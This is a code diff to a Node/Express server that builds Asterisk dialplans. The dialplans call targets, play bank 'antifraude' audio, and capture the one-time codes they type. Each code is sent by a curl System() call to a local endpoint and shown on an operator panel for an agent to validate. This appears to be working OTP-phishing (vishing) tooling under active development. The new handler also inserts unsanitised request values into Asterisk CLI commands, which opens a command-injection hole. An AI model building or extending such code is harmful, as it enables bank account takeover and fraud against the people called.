@@ -12,6 +12,7 @@ const PORT = 3000;
 // Enable gzip/deflate compression for fast asset transfer
 app.use(compression());
 app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true }));
 
 // Helper to execute AMI Action via raw TCP socket :5038 with connection pooling / debounce to prevent login/logout churn
 let amiCachedResult: { data: string; timestamp: number } | null = null;
@@ -723,7 +724,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n(captura_ok),NoOp(=== [CAPTURA-7777] CODIGO DIGITADO: \${USER_DIGITS} ===)\n`;
   dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_DEST})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
-  dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
   dialplanContent += ` same => n,Playback(beep)\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] RETORNANDO AL AGENTE \${FINAL_AGENT} ===)\n`;
@@ -810,7 +811,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
-  dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
 
   dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo audio de validacion en curso: \${IVR_WAIT} ===)\n`;
   dialplanContent += ` same => n,Playback(\${IVR_WAIT})\n`;
@@ -1260,7 +1261,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n(captura_ok),NoOp(=== [CAPTURA-7777] CODIGO DIGITADO: \${USER_DIGITS} ===)\n`;
     dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_DEST})=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
-    dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
+    dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
     dialplanContent += ` same => n,Playback(beep)\n`;
     dialplanContent += ` same => n,Wait(0.5)\n`;
     dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] RETORNANDO AL ASESOR \${FINAL_AGENT} ===)\n`;
@@ -1359,7 +1360,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
     dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
-    dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
+    dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
 
     dialplanContent += ` ; Reproducir locución de validación en curso al usuario\n`;
     dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo audio de validacion en curso: \${IVR_WAIT} ===)\n`;
@@ -2373,26 +2374,49 @@ let capturedOtpHistory: CapturedOtpItem[] = [];
 let lastAstDbSyncTime = 0;
 let isSyncingAstDb = false;
 
-// Endpoint to receive OTP captures from Asterisk curl or AMI
-app.post('/api/asterisk/otp/capture', (req, res) => {
-  const { number, otp, channel, service = 'Banco / Antifraude', status = 'pending' } = req.body;
+// Endpoint to receive OTP captures from Asterisk curl (GET or POST) or AMI
+app.all('/api/asterisk/otp/capture', (req, res) => {
+  const number = req.body?.number || req.query?.number;
+  const otp = req.body?.otp || req.query?.otp;
+  const channel = req.body?.channel || req.query?.channel;
+  const service = req.body?.service || req.query?.service || 'Banco / Antifraude';
+  const status = req.body?.status || req.query?.status || 'pending';
+
   if (otp) {
-    const cleanNumber = (number && number !== '<unknown>') ? String(number) : 'Destino Directo';
-    const record: CapturedOtpItem = {
-      id: 'otp-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
-      number: cleanNumber,
-      otp: String(otp),
-      timestamp: new Date().toLocaleTimeString(),
-      channel: channel || 'PJSIP',
-      service: service || 'Banco / Antifraude',
-      status: (status === 'valid' || status === 'invalid') ? status : 'pending',
-    };
+    const cleanNumber = (number && number !== '<unknown>') ? String(number).trim() : '8888';
+    const cleanOtp = String(otp).trim();
+    const cleanStatus = (status === 'valid' || status === 'invalid') ? status : 'pending';
+
+    // Bring or create to the very top (index 0)
+    const existingIndex = capturedOtpHistory.findIndex((r) => r.number === cleanNumber && r.otp === cleanOtp);
+    let record: CapturedOtpItem;
+    if (existingIndex >= 0) {
+      record = capturedOtpHistory.splice(existingIndex, 1)[0];
+      record.timestamp = new Date().toLocaleTimeString();
+      record.status = cleanStatus;
+      record.channel = channel ? String(channel) : record.channel;
+    } else {
+      record = {
+        id: 'otp-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
+        number: cleanNumber,
+        otp: cleanOtp,
+        timestamp: new Date().toLocaleTimeString(),
+        channel: channel ? String(channel) : 'PJSIP',
+        service: service ? String(service) : 'Banco / Antifraude',
+        status: cleanStatus,
+      };
+    }
     capturedOtpHistory.unshift(record);
     if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
     lastAstDbSyncTime = 0; // Invalidate cache so polling gets updated immediately
-    console.log(`[PRODUCCIÓN] ⭐ ¡NUEVO CÓDIGO OTP CAPTURADO (Esperando validación del agente)!: [${otp}] - Tel: ${cleanNumber}`);
+
+    console.log(`[PRODUCCIÓN] ⭐ ¡NUEVO CÓDIGO OTP CAPTURADO!: [${cleanOtp}] - Tel: ${cleanNumber}`);
+
+    // Synchronize to Asterisk AstDB in background
+    executeAsteriskCommand(`database put otp_codes "${cleanNumber}" "${cleanOtp}"`).catch(() => {});
+    executeAsteriskCommand(`database put otp_status "${cleanNumber}" "${cleanStatus}"`).catch(() => {});
   }
-  res.json({ success: true, count: capturedOtpHistory.length });
+  res.json({ success: true, count: capturedOtpHistory.length, records: capturedOtpHistory.slice(0, 10) });
 });
 
 // Endpoint for agent to decide if captured OTP is valid or invalid
@@ -2443,10 +2467,11 @@ app.post('/api/asterisk/otp/decision', async (req, res) => {
 
 // Endpoint to list all captured OTP records
 app.get('/api/asterisk/otp/records', async (req, res) => {
+  const forceFresh = req.query.fresh === '1' || req.query.fresh === 'true';
   const now = Date.now();
 
-  // Si ya se sincronizó hace menos de 2000ms o ya hay una sincronización en curso, devolver en memoria
-  if (now - lastAstDbSyncTime < 2000 || isSyncingAstDb) {
+  // Si ya se sincronizó hace menos de 2000ms y no se fuerza refresh, devolver en memoria
+  if (!forceFresh && (now - lastAstDbSyncTime < 2000 || isSyncingAstDb)) {
     return res.json({ success: true, records: capturedOtpHistory });
   }
 
@@ -2480,9 +2505,14 @@ app.get('/api/asterisk/otp/records', async (req, res) => {
         if (match) {
           const num = match[1].trim();
           const code = match[2].trim();
-          const existing = capturedOtpHistory.find((r) => r.number === num && r.otp === code);
           const currentStatus = statusMap[num] || 'pending';
-          if (!existing) {
+          const existingIndex = capturedOtpHistory.findIndex((r) => r.number === num && r.otp === code);
+
+          if (existingIndex >= 0) {
+            // Actualizar status si cambió
+            capturedOtpHistory[existingIndex].status = currentStatus;
+          } else {
+            // Nuevo registro detectado desde AstDB -> ponerlo al frente
             capturedOtpHistory.unshift({
               id: 'astdb-' + num + '-' + code,
               number: num,
